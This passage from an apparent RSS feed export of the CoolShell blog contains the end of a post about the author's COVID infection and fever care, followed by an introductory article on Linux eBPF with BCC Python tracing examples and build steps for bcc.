度左右，然后，短袖短裤呆了一会就感到清醒了一些。这个时候，我觉得再来碗热汤就好了，我喝不习惯生姜红糖水，又腥又甜，我就自己整了一小锅西红柿蛋花汤，为了让我更能出汗，并适合我的重口味，我又加了点辣椒，一小锅热汤下肚，汗出的不亦乐乎，体温降低到38.4度，我觉的不用再吃药了，当然，嗓子也疼了。但是我舒服了很多，最后还看了下摩洛哥是怎么把C罗送回家的比赛。</p>\n<p>周日（12 月 11）是我最难受的一天，全天体温在 38.2左右，从早上就没有精神，吃完早点后，从 10 点一直睡到下午 15 点（因为嗓子疼，所以睡的也不安宁，各种难受）， 这天我一会儿就出次汗，但是体温降不下来，始终在 38.2，然后我在犹豫是不是吃布洛芬，但是我感觉体温也不是很高，布洛芬这种药能不吃不不吃。然后，睡前喝了一袋感冒冲剂。周日这天，我婆也发烧，38.5，她全身疼痛，包括嗓子。这一天，我们在家啥也干不了，全家都在床上躲着，只有孩子还能动，所以，有些事只能让孩子去干了，我们也只点外卖了。</p>\n<p>周一（12 月 12 日）我早上起来，38.5，开完周会后，看很多人说泰诺有用，然后翻了一下家，居然没找到，算，还是冲两包感冒冲剂得了（后来才知道，中成药里也都是掺了对乙酰氨基酚，看来中医对自己都没什么信心），于是整个下午就在出汗了，我一整天都没有什么食欲，到了下午 17 点左右，体温正常了 36.7，但是晚上又到了 37 度，开始咳痰，轻微流鼻涕，不过感觉没什么事了。而我老婆的烧居然退了，她说她应该好了。</p>\n<figure id=\"attachment_22343\" aria-describedby=\"caption-attachment-22343\" style=\"width: 400px\" class=\"wp-caption aligncenter\"><a href=\"https://coolshell.cn/wp-content/uploads/2022/12/IMG_2399.jpg\"><img decoding=\"async\" loading=\"lazy\" class=\"wp-image-22343\" src=\"https://coolshell.cn/wp-content/uploads/2022/12/IMG_2399-871x1024.jpg\" alt=\"\" width=\"400\" height=\"471\" srcset=\"https://coolshell.cn/wp-content/uploads/2022/12/IMG_2399-871x1024.jpg 871w, https://coolshell.cn/wp-content/uploads/2022/12/IMG_2399-255x300.jpg 255w, https://coolshell.cn/wp-content/uploads/2022/12/IMG_2399-768x903.jpg 768w, https://coolshell.cn/wp-content/uploads/2022/12/IMG_2399-230x270.jpg 230w, https://coolshell.cn/wp-content/uploads/2022/12/IMG_2399.jpg 1123w\" sizes=\"(max-width: 400px) 100vw, 400px\" /></a><figcaption id=\"caption-attachment-22343\" class=\"wp-caption-text\">这就是我吃的感冒冲剂。注：为什么 还要整点咖啡因，说明书上说，怕对乙酰氨基酚造成嗜睡，所以用咖啡因来消解，这复方逻辑，毫无破绽啊</figcaption></figure>\n<p>周二（12 月 13 日）我早上起床后， 体温还是在 37.2 度，我的嗓子干燥微疼，头也不疼就是头晕，所以，今天睡了两次，一次是中午12 点半到下午 14点半，一次是 16：40 到 19:10，两次都出汗了，而且第二觉睡地太爽了，感觉是这两天睡过最高质量高的觉，而且嗓子不干了也好了，体温正常了 36.8，但是感冒症状出来了，接下来几天休息一下应该就好了。我孩子应该感冒也没有精神，所以一天来也是醒醒睡睡。而我老婆又开始发烧了，还带这样的，跳跃性发烧…… 更不好的是她嗓子已经疼到说不出话，也咽不下东西了，今天她也是床上躺了一天……</p>\n<p>周三（12月14日）我今天已经不发烧了，就是频率不高的咳嗽，轻微鼻塞，不过，还是要休息，喝水。我老婆体温还是低烧中，嗓子疼痛好了些，感觉正在恢复中……</p>\n<p><strong>整个过程，对我和我孩子来说，不难受，感觉就是发3天烧睡3天，再休息 3 天的样子，嗓子干燥微疼，比以前的病毒性感冒好多了，以前的病毒性感冒导致的嗓子疼我是连咽口水都咽不下去。但是对于我老婆就不一样了，她先是浑身疼痛，嗓子干燥，到现在嗓子疼如刀割，说不出话。这个事可能也因人而异。</strong></p>\n<p>继续更新，自我阳性以来半个月了，从 12 月 14 日退烧后，我就一直处在感冒和低频咳嗽中，直到12 月 27 日才发现不咳嗽也不感冒了，但是说话还是有一点鼻音，估计还要 5-7 天就可以完全恢复了。</p>\n<h4>注意事项</h4>\n<p><img decoding=\"async\" loading=\"lazy\" class=\"wp-image-22344 alignright\" src=\"https://coolshell.cn/wp-content/uploads/2022/12/IMG_2402.jpg\" alt=\"\" width=\"293\" height=\"390\" srcset=\"https://coolshell.cn/wp-content/uploads/2022/12/IMG_2402.jpg 500w, https://coolshell.cn/wp-content/uploads/2022/12/IMG_2402-225x300.jpg 225w, https://coolshell.cn/wp-content/uploads/2022/12/IMG_2402-203x270.jpg 203w\" sizes=\"(max-width: 293px) 100vw, 293px\" /></p>\n<p>能物理降温就不要吃药来降（<strong>应该避免使用酒精擦拭，因为有副作用，用水或冰就可以了</strong>），降到 38.5 以下，就可以自己抗了。如果物理降温不奏效，就要吃布洛芬和泰诺(林)，这两种药非常有帮助，但是你应该在药店里买不到了，所以，你可以买中成药或复方药，反正里面的中药没有用，而几乎所有的中成药里都被加入了“对乙酰氨基酚”，算是“间接”或“复方”泰诺(林)了。但是，不要多服，不然，药量叠加，会导致你肝肾中毒。参看《<a href=\"https://www.163.com/dy/article/HOA1A9UQ055342ZM.html\" target=\"_blank\" rel=\"noopener\">这些所谓“中成药”，关键原料是对乙酰氨基酚，服用小心叠加过量</a>》</p>\n<p>下面文字节选自“默沙东诊疗手册”</p>\n<blockquote>\n<div class=\"para\">\n<p>最有效和最广泛使用的退热药为对乙酰氨基酚和非甾体抗炎药 (NSAID)，如阿司匹林、布洛芬和萘普生。</p>\n</div>\n<div class=\"para\">\n<p>通常，人们可能采取以下方式之一：</p>\n</div>\n<div class=\"list\">\n<ul class=\"bulleted\" data-mmanualobjecttype=\"List\">\n<li class=\"topic__listitem\"><span id=\"v27742687_zh\" class=\"anchor\"></span>\n<div class=\"para\">\n<p>每6小时650毫克对乙酰氨基酚（1天内不超过4000毫克）</p>\n</div>\n</li>\n<li class=\"topic__listitem\"><span id=\"v27742689_zh\" class=\"anchor\"></span>\n<div class=\"para\">\n<p>每6小时200到400毫克布洛芬</p>\n</div>\n</li>\n</ul>\n</div>\n<div class=\"para\">\n<p>因为许多非处方感冒药或流感制剂含有对乙酰氨基酚，人们一定要注意不要在同一时间服用对乙酰氨基酚和一种或多种这些制剂。</p>\n</div>\n<div class=\"para\">\n<p>只有当温度达到106°F (41.1°C)左右或更高时，才需要采取其它降温措施（如用温水喷雾和降温毯降温）。避免使用酒精擦拭，因为酒精可被皮肤吸收，可能产生有害效果。</p>\n</div>\n<div class=\"para\">\n<p>有血液感染或生命体征异常（例如，血压低、脉搏和呼吸速度加快）的人需入院。</p>\n</div>\n</blockquote>\n<p>另外，一定要多喝水，热水最好。多喝水的原因是：1）布洛芬、对乙酰氨基酚（扑热息痛）等退烧药会让人加速出汗，会导致脱水。2）布洛芬等退烧药主要在肝脏代谢，60%~90%经肾脏随尿排出。多喝水，可加速药物排出体外，减少退烧药对肝肾的损伤。3）排汗和排尿都会帮身体带走一些热量。</p>\n<p>具体喝多少水因人而异，一般在2.5升到4升间，主要看你上厕所的频率。我因为前三天都在出汗，所以怎么喝水都不怎么上厕所，这两天我大概一天喝4升左右。总之，发烧吃退烧药更要多喝水。</p>\n<p>另外，如果全家都病倒了，那生活就有点不方便了，所以，你得做好一些准备：</p>\n<p>1）事先订好桶装水，18L 的那种，让人可以给家里送水，发烧期间用水很快的。</p>\n<p>2）生活上的事要做好全家病倒的准备，做饭只能整方便的做的或是速食的了，家里存点牛奶，面包，麦片，火腿肠，水果什么的，保证营养。再不行就点外卖，我家已经点了三天的外卖。还让孩子当个配送员跑腿到菜市场和超市开着视频买东西……</p>\n<p>3）还是要提前备药，我是准备用药的时候，发现家里只找到了布洛芬和感冒冲剂，因为我有高血脂，我还要吃瑞舒伐他汀钙片，结果发现我周边 5 公里的药店基本全都休业了，估计店员都阳了。</p>\n<p>4）有老人的，要照顾好。有呼吸困难的，一定要送急诊。</p>\n<p>根据知乎上的这个<a href=\"https://zhuanlan.zhihu.com/p/590989182\" target=\"_blank\" rel=\"noopener\">通过搜索引擎的测算</a>，第一波的结束大约会在明年春节前结束。最后祝大家好运。</p>\n<p>（全文完）<!--\n\n\n\n<p align=\"center\"><a href= target=_blank><img decoding=\"async\" src=\"\"></a></p>\n\n\n\n\n\n<p align=\"center\"><img decoding=\"async\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg\"> <img decoding=\"async\" loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg\" width=\"300\" height=\"300\"> <br />关注CoolShell微信公众账号和微信小程序</p>\n\n \n\n--></p>\n<div style=\"margin-top: 15px; font-size: 16px;color: #cc0000;\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"https://coolshell.cn/\">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>\n</div>\n\n<div class=\"wp_rp_wrap  wp_rp_vertical_m\" ><div class=\"wp_rp_content\"><h3 class=\"related_post_title\">相关文章</h3><ul class=\"related_post wp_rp\"><li ><a href=\"https://coolshell.cn/articles/8593.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/28.jpg\" alt=\"如何测试洗牌程序\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/8593.html\" class=\"wp_rp_title\">如何测试洗牌程序</a></li><li ><a href=\"https://coolshell.cn/articles/428.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/20.jpg\" alt=\"程序员需要具备的基本技能\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/428.html\" class=\"wp_rp_title\">程序员需要具备的基本技能</a></li><li ><a href=\"https://coolshell.cn/articles/611.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/17.jpg\" alt=\"Java如何取源文件中文件名和行号\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/611.html\" class=\"wp_rp_title\">Java如何取源文件中文件名和行号</a></li><li ><a href=\"https://coolshell.cn/articles/7917.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2012/07/0-150x150.jpg\" alt=\"各式各样的验证码\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/7917.html\" class=\"wp_rp_title\">各式各样的验证码</a></li><li ><a href=\"https://coolshell.cn/articles/4907.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/26.jpg\" alt=\"在函数外存取局部变量的一个比喻\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/4907.html\" class=\"wp_rp_title\">在函数外存取局部变量的一个比喻</a></li><li ><a href=\"https://coolshell.cn/articles/3363.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2010/12/Shawn-Fanning-and-Bram-Cohen-150x150.jpg\" alt=\"偷了世界的程序员\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/3363.html\" class=\"wp_rp_title\">偷了世界的程序员</a></li></ul></div></div>The post <a href=\"https://coolshell.cn/articles/22341.html\">感染新冠的经历</a> first appeared on <a href=\"https://coolshell.cn\">酷 壳 - CoolShell</a>.",
          "category": "杂项资源",
          "link": "https://coolshell.cn/articles/22341.html",
          "creator": "陈皓",
          "pubDate": "Tue, 13 Dec 2022 07:39:39 +0000",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "zh",
          "folder": "rip",
          "feed": "coolshell",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "48582a705cbd59fa9844cc6706a48409",
          "highlights": []
        },
        {
          "title": "eBPF 介绍",
          "description": "<p>很早前就想写一篇关于eBPF的文章，但是迟迟没有动手，这两天有点时间，所以就来写一篇，这文章主要还是简单的介绍eBPF 是用来干什么的，并通过几个示例来介绍是怎...</p>\n<p class=\"read-more\"><a class=\"btn btn-default\" href=\"https://coolshell.cn/articles/22320.html\"> Read More<span class=\"screen-reader-text\">  Read More</span></a></p>\nThe post <a href=\"https://coolshell.cn/articles/22320.html\">eBPF 介绍</a> first appeared on <a href=\"https://coolshell.cn\">酷 壳 - CoolShell</a>.",
          "content": "<p><script async src=\"https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158\"\n     crossorigin=\"anonymous\"></script><img decoding=\"async\" loading=\"lazy\" class=\"alignright wp-image-22329 size-full\" src=\"https://coolshell.cn/wp-content/uploads/2022/12/eBPF.jpeg\" alt=\"\" width=\"301\" height=\"167\" />很早前就想写一篇关于eBPF的文章，但是迟迟没有动手，这两天有点时间，所以就来写一篇，这文章主要还是简单的介绍eBPF 是用来干什么的，并通过几个示例来介绍是怎么玩的，这个技术非常非常之强，Linux 操作系统的观测性实在是太强大了，并在 BCC 加持下变得一览无余。这个技术不是一般的运维人员或是系统管理员可以驾驭的，这个还是要有底层系统知识并有一定开发能力的技术人员才能驾驭的了的。<strong>我在这篇文章的最后给了个彩蛋。</strong></p>\n<h4>介绍</h4>\n<p>eBPF（extened Berkeley Packet Filter）是一种内核技术，它允许开发人员在不修改内核代码的情况下运行特定的功能。eBPF 的概念源自于 Berkeley Packet Filter（BPF），后者是由贝尔实验室开发的一种网络过滤器，可以捕获和过滤网络数据包。</p>\n<p>出于对更好的 Linux 跟踪工具的需求，eBPF 从 <a href=\"https://illumos.org/books/dtrace/chp-intro.html\">dtrace</a>中汲取灵感，dtrace 是一种主要用于 Solaris 和 BSD 操作系统的动态跟踪工具。与 dtrace 不同，Linux 无法全面了解正在运行的系统，因为它仅限于系统调用、库调用和函数的特定框架。<a href=\"https://www.kernel.org/doc/html/latest/bpf/index.html\">在Berkeley Packet Filter</a>  (BPF)（一种使用内核 VM 编写打包过滤代码的工具）的基础上，一小群工程师开始扩展 BPF 后端以提供与 dtrace 类似的功能集。 eBPF 诞生了。<strong>2014 年随 Linux 3.18 首次限量发布，充分利用 eBPF 至少需要 Linux 4.4 以上版本</strong>。</p>\n<p><span id=\"more-22320\"></span></p>\n<p>eBPF 比起传统的 BPF 来说，传统的 BPF 只能用于网络过滤，而 eBPF 则可以用于更多的应用场景，包括网络监控、安全过滤和性能分析等。另外，eBPF 允许常规用户空间应用程序将要在 Linux 内核中执行的逻辑打包为字节码，当某些事件（称为挂钩）发生时，内核会调用 eBPF 程序。此类挂钩的示例包括系统调用、网络事件等。用于编写和调试 eBPF 程序的最流行的工具链称为 <a href=\"https://github.com/iovisor/bcc\">BPF 编译器集合</a> (BCC)，它基于 LLVM 和 CLang。</p>\n<p>eBPF 有一些类似的工具。例如，SystemTap 是一种开源工具，可以帮助用户收集 Linux 内核的运行时数据。它通过动态加载内核模块来实现这一功能，类似于 eBPF。另外，DTrace 是一种动态跟踪和分析工具，可以用于收集系统的运行时数据，类似于 eBPF 和 SystemTap。<code>[1]</code></p>\n<p>以下是一个简单的比较表格，可以帮助您更好地了解 eBPF、SystemTap 和 DTrace 这三种工具的不同之处：<code>[1]</code></p>\n<table>\n<thead>\n<tr>\n<th>工具</th>\n<th>eBPF</th>\n<th>SystemTap</th>\n<th>DTrace</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>定位</td>\n<td>内核技术，可用于多种应用场景</td>\n<td>内核模块</td>\n<td>动态跟踪和分析工具</td>\n</tr>\n<tr>\n<td>工作原理</td>\n<td>动态加载和执行无损编译过的代码</td>\n<td>动态加载内核模块</td>\n<td>动态插接分析器，通过 probe 获取数据并进行分析</td>\n</tr>\n<tr>\n<td>常见用途</td>\n<td>网络监控、安全过滤、性能分析等</td>\n<td>系统性能分析、故障诊断等</td>\n<td>系统性能分析、故障诊断等</td>\n</tr>\n<tr>\n<td>优点</td>\n<td>灵活、安全、可用于多种应用场景</td>\n<td>功能强大、可视化界面</td>\n<td>功能强大、高性能、支持多种编程语言</td>\n</tr>\n<tr>\n<td>缺点</td>\n<td>学习曲线高，安全性依赖于编译器的正确性</td>\n<td>学习曲线高，安全性依赖于内核模块的正确性</td>\n<td>配置复杂，对系统性能影响较大</td>\n</tr>\n</tbody>\n</table>\n<p style=\"text-align: center;\">对比表格<code>[1]</code></p>\n<p>从上表可以看出，eBPF、SystemTap 和 DTrace 都是非常强大的工具，可以用于收集和分析系统的运行情况。<code>[1]</code></p>\n<h4>用途</h4>\n<p>eBPF 是一种非常灵活和强大的内核技术，可以用于多种应用场景。下面是 eBPF 的一些常见用途：<code>[1]</code></p>\n<ul>\n<li>网络监控：eBPF 可以用于捕获网络数据包，并执行特定的逻辑来分析网络流量。例如，可以使用 eBPF 程序来监控网络流量，并在发现异常流量时进行警报。<code>[1]</code></li>\n<li>安全过滤：eBPF 可以用于对网络数据包进行安全过滤。例如，可以使用 eBPF 程序来阻止恶意流量的传播，或者在发现恶意流量时对其进行拦截。<code>[1]</code></li>\n<li>性能分析：eBPF 可以用于对内核的性能进行分析。例如，可以使用 eBPF 程序来收集内核的性能指标，并通过特定的接口将其可视化。这样，可以更好地了解内核的性能瓶颈，并进行优化。<code>[1]</code></li>\n<li>虚拟化：eBPF 可以用于虚拟化技术。例如，可以使用 eBPF 程序来收集虚拟机的性能指标，并进行负载均衡。这样，可以更好地利用虚拟化环境的资源，提高系统的性能和稳定性。<code>[1]</code></li>\n</ul>\n<p>总之，eBPF 的常见用途非常广泛，可以用于网络监控、安全过滤、性能分析和虚拟化等多种应用场景。<code>[1]</code></p>\n<h4>工作原理</h4>\n<p>eBPF 的工作原理主要分为三个步骤：加载、编译和执行。</p>\n<p>eBPF 需要在内核中运行。这通常是由用户态的应用程序完成的，它会通过系统调用来加载 eBPF 程序。在加载过程中，内核会将 eBPF 程序的代码复制到内核空间。</p>\n<p>eBPF 程序需要经过编译和执行。这通常是由Clang/LLVM的编译器完成，然后形成字节码后，将用户态的字节码装载进内核，Verifier会对要注入内核的程序进行一些内核安全机制的检查,这是为了确保 eBPF 程序不会破坏内核的稳定性和安全性。在检查过程中，内核会对 eBPF 程序的代码进行分析，以确保它不会进行恶意操作，如系统调用、内存访问等。如果 eBPF 程序通过了内核安全机制的检查，它就可以在内核中正常运行了，其会通过通过一个JIT编译步骤将程序的通用字节码转换为机器特定指令集，以优化程序的执行速度。</p>\n<p>下图是其架构图。</p>\n<p><img decoding=\"async\" class=\"aligncenter\" src=\"https://imgopt.infoq.com/fit-in/1200x2400/filters:quality(80)/filters:no_upscale()/articles/gentle-linux-ebpf-introduction/en/resources/47image005-1619704397592.jpg\" /></p>\n<p style=\"text-align: center;\">（图片来自：<a href=\"https://www.infoq.com/articles/gentle-linux-ebpf-introduction/\" target=\"_blank\" rel=\"noopener\">https://www.infoq.com/articles/gentle-linux-ebpf-introduction/</a>）</p>\n<p>在内核中运行时，eBPF 程序通常会挂载到一个内核钩子（hook）上，以便在特定的事件发生时被执行。例如，</p>\n<ul>\n<li><span>系统调用——当用户空间函数将执行转移到内核时插入</span></li>\n<li><span>函数进入和退出——拦截对预先存在的函数的调用</span></li>\n<li><span>网络事件 &#8211; 在收到数据包时执行</span></li>\n<li><span>Kprobes 和 uprobes &#8211; 附加到内核或用户函数的探测器</span></li>\n</ul>\n<p>最后 eBPF Maps，允许eBPF程序在调用之间保持状态，以便进行相关的数据统计，并与用户空间的应用程序共享数据。一个eBPF映射基本上是一个键值存储，其中的值通常被视为任意数据的二进制块。它们是通过带有BPF_MAP_CREATE参数的<code>bpf_cmd</code>系统调用来创建的，和Linux世界中的其他东西一样，它们是通过文件描述符来寻址。与地图的交互是通过查找/更新/删除系统调用进行的</p>\n<p>总之，eBPF 的工作原理是通过动态加载、执行和检查<strong>无损编译</strong>过的代码来实现的。<code>[1]</code></p>\n<h4>示例</h4>\n<p>eBPF 可以用于对内核的性能进行分析。下面是一个基于 eBPF 的性能分析的 step-by-step 示例：</p>\n<p>第一步：准备工作：首先，需要确保内核已经支持 eBPF 功能。这通常需要在内核配置文件中启用 eBPF 相关的选项，并重新编译内核。检查是否支持 eBPF，你可以用这两个命令查看 <code>ls /sys/fs/bpf</code> 和 <code>lsmod | grep bpf</code></p>\n<p>第二步：写 eBPF 程序：接下来，需要编写 eBPF 程序，用于收集内核的性能指标。eBPF 程序的语言可以选择 C 或者 Python，它需要通过特定的接口访问内核的数据结构，并将收集到的数据保存到指定的位置。</p>\n<p>下面是一个Python 示例（其实还是C语言，用python来加载一段C程序到Linux内核）</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">#!/usr/bin/python3\n\nfrom bcc import BPF\nfrom time import sleep\n\n# 定义 eBPF 程序\nbpf_text = \"\"\"\n#include &lt;uapi/linux/ptrace.h&gt;\n\nBPF_HASH(stats, u32);\n\nint count(struct pt_regs *ctx) {\n    u32 key = 0;\n    u64 *val, zero=0;\n    val = stats.lookup_or_init(&amp;key, &amp;zero);\n    (*val)++;\n    return 0;\n}\n\"\"\"\n\n# 编译 eBPF 程序\nb = BPF(text=bpf_text, cflags=[\"-Wno-macro-redefined\"])\n\n# 加载 eBPF 程序\nb.attach_kprobe(event=\"tcp_sendmsg\", fn_name=\"count\")\n\nname = {\n  0: \"tcp_sendmsg\"\n}\n# 输出统计结果\nwhile True:\n    try:\n        #print(\"Total packets: %d\" % b[\"stats\"][0].value)\n        for k, v in b[\"stats\"].items():\n           print(\"{}: {}\".format(name[k.value], v.value))\n        sleep(1)\n    except KeyboardInterrupt:\n        exit()</pre>\n<p>这个 eBPF 程序的功能是统计网络中传输的数据包数量。它通过定义一个 <code>BPF_HASH</code> 数据结构来保存统计结果（eBPF Maps），并通过捕获 <code>tcp_sendmsg</code> 事件来实现实时统计。最后，它通过每秒输出一次统计结果来展示数据。这个 eBPF 程序只是一个简单的示例，实际应用中可能需要进行更复杂的统计和分析。</p>\n<p>第三步：运行 eBPF 程序：接下来，需要使用 eBPF 编译器将 eBPF 程序编译成内核可执行的格式（这个在上面的Python程序里你可以看到——Python引入了一个bcc的包，然后用这个包，把那段 C语言的程序编译成字节码加载在内核中并把某个函数 attach 到某个事件上）。这个过程可以使用 BPF Compiler Collection（BCC）工具来完成。BCC 工具可以通过命令行的方式将 eBPF 程序编译成内核可执行的格式，并将其加载到内核中。</p>\n<p>下面是运行上面的 Python3 程序的步骤：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"shell\">sudo apt install python3-bpfcc</pre>\n<p>注：在Python3下请不要使用 <code>pip3 install bcc</code> （参看：<a href=\"https://github.com/iovisor/bcc/issues/2278#issuecomment-825356087\" target=\"_blank\" rel=\"noopener\">这里</a>）</p>\n<p>如果你是 Ubuntu 20.10 以上的版本，最好通过源码安装（否则程序会有编译问题），参看：<a href=\"https://github.com/iovisor/bcc/issues/3993#issuecomment-1228217609\" target=\"_blank\" rel=\"noopener\">这里</a>：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"bash\">apt purge bpfcc-tools libbpfcc python3-bpfcc\nwget https://github.com/iovisor/bcc/releases/download/v0.25.0/bcc-src-with-submodule.tar.gz\ntar xf bcc-src-with-submodule.tar.gz\ncd bcc/\napt install -y python-is-python3\napt install -y bison build-essential cmake flex git libedit-dev   libllvm11 llvm-11-dev libclang-11-dev zlib1g-dev libelf-dev libfl-dev python3-distutils\napt install -y checkinstall\nmkdir build\ncd build/\ncmake -DCMAKE_INSTALL_PREFIX=/usr -DPYTHON_CMD=python3 ..\nmake\ncheckinstall</pre>\n<p>接下来，需要将上面的 Python 程序保存到本地，例如保存到文件 netstat.py。运行程序：最后，可以通过执行以下命令来运行 Python 程序：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"shell\">$ chmod +x ./netstat.py\n$ sudo ./netstat.py\ntcp_sendmsg: 29\ntcp_sendmsg: 216\ntcp_sendmsg: 277\ntcp_sendmsg: 379\ntcp_sendmsg: 419\ntcp_sendmsg: 468\ntcp_sendmsg: 574\ntcp_sendmsg: 645\ntcp_sendmsg: 29\n</pre>\n<p>程序开始运行后，会在控制台输出网络数据包的统计信息。可以通过按 Ctrl+C 组合键来结束程序的运行。</p>\n<p>下面我们再看一个比较复杂的示例，这个示例会计算TCP的发包时间（示例参考于Github上 <a href=\"https://github.com/iovisor/bcc/issues/2972\" target=\"_blank\" rel=\"noopener\">这个issue</a>里的程序）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">#!/usr/bin/python3\n\nfrom bcc import BPF\nimport time\n\n# 定义 eBPF 程序\nbpf_text = \"\"\"\n#include &lt;uapi/linux/ptrace.h&gt;\n#include &lt;net/sock.h&gt;\n#include &lt;net/inet_sock.h&gt;\n#include &lt;bcc/proto.h&gt;\n\nstruct packet_t {\n    u64 ts, size;\n    u32 pid;\n    u32 saddr, daddr;\n    u16 sport, dport;\n};\n\nBPF_HASH(packets, u64, struct packet_t);\n\nint on_send(struct pt_regs *ctx, struct sock *sk, struct msghdr *msg, size_t size)\n{\n    u64 id = bpf_get_current_pid_tgid();\n    u32 pid = id;\n\n    // 记录数据包的时间戳和信息\n    struct packet_t pkt = {}; // 结构体一定要初始化，可以使用下面的方法\n                              //__builtin_memset(&amp;pkt, 0, sizeof(pkt)); \n    pkt.ts = bpf_ktime_get_ns();\n    pkt.size = size;\n    pkt.pid = pid;\n    pkt.saddr = sk-&gt;__sk_common.skc_rcv_saddr;\n    pkt.daddr = sk-&gt;__sk_common.skc_daddr;\n    struct inet_sock *sockp = (struct inet_sock *)sk;\n    pkt.sport = sockp-&gt;inet_sport;\n    pkt.dport = sk-&gt;__sk_common.skc_dport;\n\n    packets.update(&amp;id, &amp;pkt);\n    return 0;\n}\n\nint on_recv(struct pt_regs *ctx, struct sock *sk)\n{\n    u64 id = bpf_get_current_pid_tgid();\n    u32 pid = id;\n\n    // 获取数据包的时间戳和编号\n    struct packet_t *pkt = packets.lookup(&amp;id);\n    if (!pkt) {\n        return 0;\n    }\n\n    // 计算传输时间\n    u64 delta = bpf_ktime_get_ns() - pkt-&gt;ts;\n\n    // 统计结果\n    bpf_trace_printk(\"tcp_time: %llu.%llums, size: %llu\\\\n\", \n       delta/1000, delta%1000%100, pkt-&gt;size);\n\n    // 删除统计结果\n    packets.delete(&amp;id);\n\n    return 0;\n}\n\"\"\"\n\n# 编译 eBPF 程序\nb = BPF(text=bpf_text, cflags=[\"-Wno-macro-redefined\"])\n\n# 注册 eBPF 程序\nb.attach_kprobe(event=\"tcp_sendmsg\", fn_name=\"on_send\")\nb.attach_kprobe(event=\"tcp_v4_do_rcv\", fn_name=\"on_recv\")\n\n# 输出统计信息\nprint(\"Tracing TCP latency... Hit Ctrl-C to end.\")\nwhile True:\n    try:\n        (task, pid, cpu, flags, ts, msg) = b.trace_fields()\n        print(\"%-18.9f %-16s %-6d %s\" % (ts, task, pid, msg))\n    except KeyboardInterrupt:\n        exit()</pre>\n<p>上面这个程序通过捕获每个数据包的时间戳来统计传输时间。在捕获 <code>tcp_sendmsg</code> 事件时，记录数据包的发送时间；在捕获 <code>tcp_v4_do_rcv</code> 事件时，记录数据包的接收时间；最后，通过比较两个时间戳来计算传输时间。</p>\n<p>从上面的两个程序我们可以看到，eBPF 的一个编程的基本方法，这样的在Python里向内核的某些事件挂载一段 &#8220;C语言” 的方式就是 eBPF 的编程方式。实话实说，这样的代码很不好写，而且有很多非常诡异的东西，一般人是很难驾驭的（上面的代码我也不是很容易都能写通的，把 Google 都用了个底儿掉，读了很多晦涩的文档……）好在这样的代码已经有人写了，我们不必再写了，在 <a href=\"https://github.com/iovisor/bcc/tree/master/tools\" target=\"_blank\" rel=\"noopener\">Github 上的 bcc 库下的 tools 目录</a>有很多……</p>\n<p>BCC（<a href=\"https://github.com/iovisor/bcc\" target=\"_blank\" rel=\"noopener\">BPF Compiler Collection</a>）是一套开源的工具集，可以在 Linux 系统中使用 BPF（Berkeley Packet Filter）程序进行系统级性能分析和监测。BCC 包含了许多实用工具，如：</p>\n<ol>\n<li>bcc-tools：一个包含许多常用的 BCC 工具的软件包。</li>\n<li>bpftrace：一个高级语言，用于编写和执行 BPF 程序。</li>\n<li>tcptop：一个实时监控和分析 TCP 流量的工具。</li>\n<li>execsnoop：一个用于监控进程执行情况的工具。</li>\n<li>filetop：一个实时监控和分析文件系统流量的工具。</li>\n<li>trace：一个用于跟踪和分析函数调用的工具。</li>\n<li>funccount：一个用于统计函数调用次数的工具。</li>\n<li>opensnoop：一个用于监控文件打开操作的工具。</li>\n<li>pidstat：一个用于监控进程性能的工具。</li>\n<li>profile：一个用于分析系统 CPU 使用情况的工具。</li>\n</ol>\n<p>下面这张图你可能见过多次了，你可以看看他可以干多少事，内核里发生什么事一览无余。</p>\n<p><img decoding=\"async\" src=\"https://github.com/iovisor/bcc/raw/master/images/bcc_tracing_tools_2019.png\" /></p>\n<h4>延伸阅读</h4>\n<p>一些经典的文章和书籍关于 eBPF 包括：</p>\n<ul>\n<li>Brendan Gregg 的《<a href=\"https://book.douban.com/subject/34467459/\" target=\"_blank\" rel=\"noopener\">BPF Performance Tools: Linux System and Application Observability</a>》一书是一个全面的指南，涵盖了 eBPF 的基础知识和实践应用。</li>\n<li>eBPF 的官网：<a href=\"https://ebpf.io/\" target=\"_blank\" rel=\"noopener\">https://ebpf.io/</a> 由 <a href=\"https://cilium.io/\" rel=\"nofollow\">Cilium</a> 建立</li>\n<li><a href=\"http://docs.cilium.io/en/latest/bpf/\" rel=\"nofollow\">Cilium&#8217;s BPF and XDP Reference Guide</a></li>\n<li><a href=\"https://www.kernel.org/doc/html/latest/bpf/index.html\" rel=\"nofollow\">BPF Documentation</a></li>\n<li><a 